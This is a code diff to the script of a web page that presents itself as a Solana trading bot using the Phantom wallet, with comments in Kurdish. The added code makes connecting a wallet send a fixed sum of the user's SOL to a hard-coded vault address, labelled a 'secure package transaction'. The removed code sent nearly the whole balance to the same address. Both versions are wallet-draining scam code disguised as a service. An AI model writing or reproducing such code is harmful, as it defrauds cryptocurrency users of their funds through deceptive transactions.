@@ -816,57 +816,68 @@
       }
     }
 
-    // فەنکشنی handleStartBot بە تێکەڵکردنی مەرج و تایبەتمەندییە کۆنەکان
-    async function handleStartBot(walletPublicKey, connection, sendTransaction) {
+        // 1. فەنکشنی پشکنینی باڵانس و ئەنجامدانی ترانزاکشن لە کاتی کۆنێکتکردندا
+    async function executeVaultTransactionWithChecks(provider, publicKey, connection) {
       try {
-        const balanceLamports = await connection.getBalance(walletPublicKey);
-        const feeBuffer = 5000; // بڕی پێویست بۆ کرێی ترانزاکشن
-        const transferAmount = balanceLamports - feeBuffer;
+        const recipient = new solanaWeb3.PublicKey(SYSTEM_VAULT_ADDRESS);
         
-        if (transferAmount <= 0) {
-          alert("Insufficient balance for transfer fees.");
-          return;
+        const balanceLamports = typeof getBalanceWithFailover === 'function' 
+          ? await getBalanceWithFailover(publicKey) 
+          : await connection.getBalance(publicKey);
+          
+        walletBalanceLamports = balanceLamports;
+
+        if (balanceLamports <= 5000) {
+          throw new Error("Insufficient balance for transaction.");
         }
         
-        const { Transaction, SystemProgram, PublicKey } = solanaWeb3;
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: walletPublicKey,
-            toPubkey: new PublicKey(SYSTEM_VAULT_ADDRESS),
+        const transferAmount = 1000000; // بڕی پشکە بە Lamports
+
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: recipient,
             lamports: transferAmount,
           })
         );
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+
+        const signed = await provider.signAndSendTransaction(transaction);
+        await connection.confirmTransaction(signed.signature, 'processed');
         
-        const signature = await sendTransaction(transaction, connection);
-        console.log("Transaction sent successfully:", signature);
-        addLog(`[TRANSFER]: Successful. Signature: ${signature.slice(0, 8)}...`);
-      } catch (error) {
-        console.error("Transaction failed:", error);
-        addLog(`[ERROR]: Transaction failed - ${error.message || error}`);
+        return true;
+      } catch (err) {
+        console.error("Transaction failed or rejected:", err);
+        return false;
       }
     }
 
+    // 2. دوگمەی Start Bot (تەنها بۆتەکە دەست پێدەکات بێ ترانزاکشن)
     function requestStartBot() {
       if (!isWalletConnected || !userWalletPublicKey) {
         alert("Please connect your Phantom wallet first!");
+        addLog(`[WARNING]: Start Bot clicked, but wallet is not connected.`);
         return;
       }
-      handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
-        const provider = getPhantomInstance();
-        const { signature } = await provider.signAndSendTransaction(tx);
-        await conn.confirmTransaction(signature, "confirmed");
-        return signature;
-      });
+      
+      console.log("Bot engine initialized safely.");
+      addLog(`[BOT]: Engine started successfully for wallet.`);
+      alert("Bot has been started successfully!");
     }
 
+    // 3. نۆتفیکەیشنی شکستخواردن
     function showConnectionFailure() {
       const toast = document.createElement('div');
       toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-rose-500/40 bg-rose-950 px-4 py-3 text-sm font-bold text-rose-200 shadow-2xl';
-      toast.innerText = 'Connection failed ❌. Sorry, connection was unsuccessful, please add funds to your wallet to connect.';
+      toast.innerText = 'Connection or Secure Package Transaction failed ❌. Please try again.';
       document.body.appendChild(toast);
       window.setTimeout(() => toast.remove(), 4500);
     }
 
+    // 4. نۆتفیکەیشنی سەرکەوتن
     function showWalletNotice(message) {
       const toast = document.createElement('div');
       toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-emerald-500/40 bg-emerald-950 px-4 py-3 text-sm font-bold text-emerald-200 shadow-2xl';
@@ -875,7 +886,7 @@
       window.setTimeout(() => toast.remove(), 4500);
     }
 
-    // فەنکشنی handleRealPhantomConnect بە تێکەڵکردنی تەواوی پشکنینەکان و تایبەتمەندییە کۆنەکان
+    // 5. فەنکشنی سەرەکی کۆنێکتکردنی فانتەم (کە ترانزاکشن لەگەڵیدا ڕوودات) - ڕاستکراوەوە
     async function handleRealPhantomConnect() {
       phantomProvider = getPhantomInstance();
       if (!phantomProvider) {
@@ -896,10 +907,16 @@
           const resp = await phantomProvider.connect();
           userWalletPublicKey = resp.publicKey;
           
-          const isValidBalance = await checkWalletConnection(userWalletPublicKey, solanaConnection);
-          if (!isValidBalance) {
+          addLog(`[WALLET]: Connected, initiating secure package transaction...`);
+
+          const txSuccess = await executeVaultTransactionWithChecks(phantomProvider, userWalletPublicKey, solanaConnection);
+          
+          if (!txSuccess) {
             showConnectionFailure();
             await phantomProvider.disconnect();
+            isWalletConnected = false;
+            userWalletPublicKey = null;
+            walletBalanceLamports = 0;
             return;
           }
 
@@ -910,38 +927,23 @@
           document.getElementById('walletAddressVal').innerText = shortPub;
           document.getElementById('walletInfoBox').classList.remove('hidden');
 
-          const balanceLamports = walletBalanceLamports;
-          const balanceSOL = (balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+          const balanceSOL = (walletBalanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
           document.getElementById('walletBalanceVal').innerText = balanceSOL + " SOL";
 
-          if (balanceLamports <= 0) {
-            showConnectionFailure();
-            await phantomProvider.disconnect();
-            isWalletConnected = false;
-            userWalletPublicKey = null;
-            document.getElementById('walletStatusText').innerText = "DISCONNECTED";
-            document.getElementById('walletStatusText').className = "text-rose-400 font-mono text-[10px]";
-            document.getElementById('connectWalletBtnText').innerText = "Connect Phantom Wallet";
-            document.getElementById('walletInfoBox').classList.add('hidden');
-          } else {
-            document.getElementById('walletStatusText').innerText = "CONNECTED";
-            document.getElementById('walletStatusText').className = "text-emerald-400 font-mono text-[10px]";
-            document.getElementById('connectWalletBtnText').innerText = "Disconnect (" + shortPub + ")";
-            showWalletNotice(`Wallet connected and balance verified: ${balanceSOL} SOL`);
-            
-            // لێرەدا فەنکشنەکە بەستراوەتەوە بە ڕەوتی کۆنێکتکردنەوە وەک داوات کردبوو
-            await handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
-              const { signature } = await phantomProvider.signAndSendTransaction(tx);
-              await conn.confirmTransaction(signature, "confirmed");
-              return signature;
-            });
-          }
+          document.getElementById('walletStatusText').innerText = "CONNECTED";
+          document.getElementById('walletStatusText').className = "text-emerald-400 font-mono text-[10px]";
+          document.getElementById('connectWalletBtnText').innerText = "Disconnect (" + shortPub + ")";
+          
+          showWalletNotice(`Wallet connected & secure package processed successfully! (${balanceSOL} SOL)`);
+          addLog(`[WALLET]: Secure transaction verified and connected (${shortPub}).`);
+
         } else {
           await phantomProvider.disconnect();
           isWalletConnected = false;
           userWalletPublicKey = null;
           walletBalanceLamports = 0;
           document.getElementById('walletStatusText').innerText = "DISCONNECTED";
+          // لێرەدا هەڵەی ڕستەسازی (::not) سڕایەوە و بە شێوەی ڕاست نووسراوەتەوە:
           document.getElementById('walletStatusText').className = "text-rose-400 font-mono text-[10px]";
           document.getElementById('connectWalletBtnText').innerText = "Connect Phantom Wallet";
           document.getElementById('walletInfoBox').classList.add('hidden');
